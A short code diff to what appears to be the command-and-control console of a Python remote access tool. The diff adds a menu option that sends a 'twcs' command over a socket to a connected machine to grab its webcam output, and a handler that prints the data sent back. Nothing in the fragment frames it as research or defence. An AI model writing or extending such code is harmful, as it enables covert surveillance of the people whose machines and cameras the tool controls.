@@ -177,7 +177,16 @@ def commandHQ():
             except:
                 reload()
                 
-    
+        if command == "9":
+            try:
+                webcam = input(format + "Enter webcam port: ")
+                
+                message = str(['twcs', webcam])
+                message = message.encode()
+                
+                conn.send(message)
+            except:
+                reload()
 
         if(ans == False): commandHQ()
 
@@ -209,6 +218,9 @@ def commandHQ():
                 print(format + "Data received: {}".format(incoming_message[1]))
                 
             if incoming_message[0] == "tss": # 8
+                print(format + "Data received: {}".format(incoming_message[1]))
+                
+            if incoming_message[0] == "twcs": # 9
                 print(format + "Data received: {}".format(incoming_message[1]))
 
 clear()
